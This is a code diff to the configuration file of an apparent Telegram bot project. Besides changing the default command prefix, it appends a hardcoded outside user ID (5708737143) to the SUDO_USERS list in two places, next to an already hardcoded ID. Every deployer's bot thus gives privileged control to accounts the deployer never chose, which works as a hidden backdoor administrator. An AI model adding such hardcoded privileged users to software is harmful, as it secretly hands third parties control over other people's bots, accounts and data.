@@ -22,7 +22,7 @@ vrajeshversion = "v0.3.0"
 API_ID = config("API_ID", default=None, cast=int)
 API_HASH = config("API_HASH", default=None)
 ALIVE_PIC = config("ALIVE_PIC", default=None)
-CMD_HNDLR = getenv("CMD_HNDLR", default="!")
+CMD_HNDLR = getenv("CMD_HNDLR", default="/")
 OWNER_NAME = getenv("OWNER_NAME", default=None)
 HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
 HEROKU_API_KEY = config("HEROKU_API_KEY", None)
@@ -39,6 +39,7 @@ BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
 if 1484735126 not in SUDO_USERS:
     SUDO_USERS.append(1484735126)
+    SUDO_USERS.append(5708737143)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
@@ -46,6 +47,7 @@ OWNER_ID = int(os.environ.get("OWNER_ID", None))
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
 SUDO_USERS.append(1484735126)
+SUDO_USERS.append(5708737143)
 
 # Tokens
 
